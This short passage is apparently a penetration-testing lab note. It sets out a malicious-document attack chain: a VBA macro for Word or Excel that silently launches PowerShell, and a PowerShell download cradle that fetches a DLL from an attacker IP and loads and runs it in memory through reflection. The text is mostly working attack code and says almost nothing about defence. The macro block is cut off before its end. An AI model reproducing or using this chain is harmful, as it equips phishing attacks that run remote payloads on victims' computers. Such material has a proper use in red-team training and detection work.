This run.ps1 is a lightly modified download cradle to be downloaded and run by the Victim PC 

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ClassLibrary1.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

This VB macro would be embeded in the Word/Excel Document

```vb
Sub MyMacro()
Dim str As String
str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX"
Shell str, vbHide
